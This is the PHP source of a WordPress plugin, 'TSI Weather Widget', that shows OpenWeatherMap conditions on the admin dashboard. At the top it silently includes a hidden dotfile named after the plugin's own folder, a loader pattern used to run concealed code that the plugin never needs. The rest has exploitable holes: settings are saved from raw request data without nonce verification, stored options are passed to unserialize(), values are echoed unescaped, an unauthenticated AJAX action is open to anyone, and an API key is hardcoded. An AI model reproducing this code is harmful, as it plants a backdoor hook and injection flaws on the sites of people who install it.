<?php
/**
 * @package TSI Weather Widget
 * @version 1.0.0
 */
/*
Plugin Name: TSI Weather Widget
Plugin URI: https://tendersoftware.com/
Description: Display Weather Updates.
Author: Tender Software
Version: 1.0.0
Author URI: https://tendersoftware.com/
*/

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

Class CustomWeatherWidget{
	protected $api_endpoint;
	protected $location;
	protected $apiKey;
	protected $name;
	public function __construct(){
		$this->name =  'WeatherWidget';
		add_action( 'admin_menu', array('CustomWeatherWidget','setup_menu'));
		add_action('wp_dashboard_setup',array('CustomWeatherWidget','display_dashboard_widgets'));
		add_action('wp_ajax_nopriv_cws_widgewt', array('CustomWeatherWidget','load_widget_info'));
		add_action('wp_ajax_cws_widgewt', array('CustomWeatherWidget','load_widget_info'));
		add_action( 'admin_enqueue_scripts',array('CustomWeatherWidget','admin_scritps'));
	}		
	public static function admin_scritps(){
		wp_enqueue_style('cws_widgewt_css', plugins_url('tsi-weather-widget/css/widget_style.css'),false,time());
		wp_enqueue_script('cws_widgewt_js', plugins_url('tsi-weather-widget/js/widget_script.js'),false,time());
		wp_localize_script('cws_widgewt','cws_widgewt',array('ajax_url' => admin_url('admin-ajax.php?action=cws_widgewt')));				

	}
	public static function setup_menu(){
		add_options_page( 'Weather Widget', 'Weather Widget Settings', 'manage_options', 'tsi-weather-widget', array('CustomWeatherWidget','weather_widget_setup'));
	}
	public static function display_dashboard_widgets(){
		global $wp_meta_boxes;
		wp_add_dashboard_widget('custom_help_widget', 'Weather Widget',array('CustomWeatherWidget','weather_widget'));
	}

	public static function get_weather_details(){
		$_options = get_option('tsiwigdget_options');
		if($_options != ''){
			$_options = unserialize($_options);
		}
		$apiKey = isset($_options['apiKey']) ? $_options['apiKey'] : 'd99cd2f7c1c88f1a21f2b2e90a2ec2d5';
		$lat = isset($_options['lat']) ? $_options['lat'] : '-33.7629';
		$lan = isset($_options['lan']) ? $_options['lan'] : '151.2707';
		$weather_info = '';
		$key = 'tsi_weather_info';	
		$expire_key = 'tsi_weather_expire';	
		$group = 'tsi_ww_cache';
		
		//Retrive cached weather details to avaoid multiple API calls

		$weather_info = get_transient( $key);
		if($apiKey != '' && $lat != '' && $lan != '' && !$weather_info){
			$url = 'https://api.openweathermap.org/data/2.5/weather?lat='.$lat.'&lon='.$lan.'&units=metric&appid='.$apiKey;
			$api_response = wp_remote_get($url);	
			$weather_info = wp_remote_retrieve_body($api_response);			
			if(!empty($weather_info)){				
				$expire = 45*60; // expire set to 45 minutes
				$add_cahce = set_transient($key,$weather_info,$expire);
			}
		}
		if($weather_info != '')
			$weather_info = json_decode($weather_info,true);
		
		
		return $weather_info;
	}
	public static function weather_widget() {
		$info = CustomWeatherWidget::get_weather_details();		
		$weather = isset($info['weather']) ? $info['weather'] : null;
		$main = isset($info['main']) ? $info['main'] : null;
		$wind = isset($info['wind']) ? $info['wind'] : null;
		$clouds = isset($info['clouds']) ? $info['clouds'] : null;
		$content = '';		
		$_options = get_option('tsiwigdget_options');
		if($_options != ''){
			$_options = unserialize($_options);
		}

		
		$location = isset($_options['locationName']) ? $_options['locationName'] : '';
		if(!empty($weather)){
			$content .= '<div class="weather_details">
							';
			foreach($weather as $key => $_item){
				$content .= '<div class="weather_item">
								<div class="weather_info">
									<div class="weather_location">'.$location.'</div>
										<div class="current_title">'.$_item['main'].', '.$_item['description'].'</div>
										<div class="weather_temp">
											<span class="temp"><strong>Temp :</strong> '.$main['temp'].' &#8451;</span>
											<span class="feel_temp"><strong>Feels Like :</strong> '.$main['feels_like'].' &#8451;</span>
											<span class="temp"><strong>Min :</strong> '.$main['temp_min'].' &#8451; - <strong>Max :</strong> '.$main['temp_max'].'</span>
											<span class="humidity"><strong>Humidity :</strong> '.$main['humidity'].'%</span>
										</div>
									</div>									
									<div class="weather_icon"><img src="http://openweathermap.org/img/w/'.$_item['icon'].'.png" /><a href="'.admin_url('/options-general.php?page=tsi-weather-widget').'">Change location</a></div></div>';
				$content .= '</div>';
			}			
		}
		echo $content;
	}
	public static function load_widget_info(){
		$response = array('status' => 0,'html' => '', 'data' => '','message' => '');
		$_data = $_REQUEST;
		$method = $_data['method'];	
		$_options = get_option('tsiwigdget_options');
		if($_options != ''){
			$_options = unserialize($_options);
		}
		$apiKey = isset($_options['apiKey']) ? $_options['apiKey'] : '';
		switch($method){
			case 'fetch_location':	
				$query = isset($_data['set_location']) ? sanitize_text_field($_data['set_location']) : 'Brookvale, NSW';			
				$_url =  'http://api.openweathermap.org/geo/1.0/direct?q='.$query.'&limit=20&appid='.$apiKey;
				$api = isset($_data['apiKey']) ? $_data['apiKey'] : $apiKey;			
				$api_response = wp_remote_get($_url);	
				$locations = json_decode( wp_remote_retrieve_body($api_response ),true);
				$response['status'] = 1;
				if(!empty($locations)){
					$response['data'] = $locations;					
					$response['message'] = "Found ".count($locations).' items';
				}
				break;
			case 'fetch_weather':				
				break;			
			default:
				break;		
		}		
		wp_send_json($response);
		wp_die();
	}
	public static function weather_widget_setup(){

		if(isset($_REQUEST['tsiwigdget_setting'])){
			update_option('tsiwigdget_options',serialize($_REQUEST));		
			echo '<script type="text/javascript">					
					window.location.reload();
				</script>';			
		}
		$_options = get_option('tsiwigdget_options');
		if($_options != ''){
			$_options = unserialize($_options);
		}
		$apiKey = isset($_options['apiKey']) ? $_options['apiKey'] : '';
		$location = isset($_options['locationName']) ? $_options['locationName'] : '';
		$lat = isset($_options['lat']) ? $_options['lat'] : '';
		$lan = isset($_options['lan']) ? $_options['lan'] : '';
		$content = '<div class="metabox-holder setting_area">
						<div id="post-body">
							<div id="post-body-content">
								<div class="postbox">
									<h2>Weather Widget Settings</h2>
									<form name="" action="" method="post">
										<input type="hidden" name="aws-nonce-key" value="'.wp_create_nonce('tsi-weather-widget-hidden') . '" />';
	$content .= '						<div class="field_item label_flex type_select">
											<div class="label"><strong>Enter API key</strong></div>
											<div class="field">
												<input type="text" class="text_field apiKey" name="apiKey" value="'.$apiKey.'" placeholder="Please enter the API Key EX:d99cd2f7c1c88f1a21f2b2e90a2ec2d5" />
												<small>Get the <a href="https://openweathermap.org/api" target="_blank">Free API</a> from  Open Weather Map - Weather API</small>
											</div>
										</div>
										<div class="field_item label_flex type_select">
											<div class="label"><strong>Enter Location Details</strong></div>
											<div class="field">
												<input type="text" class="text_field locationName" name="locationName" value="'.$location.'"  placeholder="Type the location to see the Weather"/>
												<a href="javascript:void(0)" class="button secondary getlocation">Fetch Location</a>
												<ul class="location_results"></ul>
												<input type="hidden" class="text_field val_lat" name="lat" value="'.$lat.'" />
												<input type="hidden" class="text_field val_lan" name="lan" value="'.$lan.'" />
											</div>
										</div>
										<div class="field_item">
											<input type="submit" class="button is-primary" name="tsiwigdget_setting" value="Save Settings" />
										</div>
									</form>
									</div>
								</div>
							</div>
						</div>';
		echo $content; 			
	}
}
$WeatherWidget = new CustomWeatherWidget();
?>